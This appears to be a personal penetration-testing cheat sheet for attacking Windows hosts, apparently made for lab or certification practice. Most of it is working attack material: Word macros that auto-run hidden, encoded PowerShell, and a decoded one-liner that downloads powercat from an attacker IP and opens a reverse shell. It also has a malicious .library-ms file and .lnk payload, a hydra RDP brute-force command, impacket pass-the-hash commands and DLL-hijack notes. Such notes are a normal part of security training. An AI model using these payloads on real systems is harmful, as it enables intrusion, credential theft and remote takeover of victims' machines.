## Windows
WinPEAS
JAWS
SeatBelt

Windows Key + X: Power user menu



Interesting Files and directories:

C:\inetpub
C:/xampp/apache/logs/access.log
C:\Windows\system32\cmd.exe
C:\tools\Office2019.img
c:\Windows\System32\Drivers\etc\hosts
C:\Windows\system32\config\sam (use mimikatz)
C:\Users\[your user name]\.ssh

Great commands:

(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
whoami /groups
ipconfig /all
systeminfo
route print
netstat -ano

Metasploit:
 search UAC
 
NTLM:
 Kiwi
 


RCE Tools:
 powercat.ps1
 
 View file from command line:
  type flag.txt
  
  Use UTF-16LE base64 encoding for powershell.  
  
  
  Macros:
 
 run powershell:
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub

download powercat:
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ... ((PowerSHell Encoding must be UTF-16 Little Endian))
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub


Decoded b64 string from previous script:
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell


Evil Library: (save as .library-ms)
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">



	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
		
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>

	<templateInfo>
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>

	<searchConnectorDescriptionList>
		<searchConnectorDescription>
			<isDefaultSaveLocation>true</isDefaultSaveLocation>
			<isSupported>false</isSupported>
			<simpleLocation>
				<url>http://192.168.45.237</url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>

</libraryDescription>

Host Evil Library:
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /tmp/webdav/


Evil .Lnk
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.238:8000/powercat.ps1');
powercat -c 192.168.45.238 -p 4444 -e powershell"


Debug:
To verify this, we'll first need to start the Sync Breeze Service on the Windows 10 client. Next, we can launch Immunity Debugger as administrator, click on File > Attach, and select the syncbrs process. Once attached, we'll click on the View menu, then Executable modules. From there, we can verify that msvbvm60.dll is not present by checking the Name and Path values.

Disassemble:
 objdump
 
 


Bruteforce RDP:

sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

Command Execution
impacket
psexec.py
wmiexec.py

NTLM Hash:
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
shell:
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

NTLMv2 Hash:
Responder

For the powershell web app challenge:
Archive=Get-ChildItem%20-Force%20C:\Users\anastasia

DLL Hijack:
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable. echo %PATH%

see environment variables:
cmd> set 

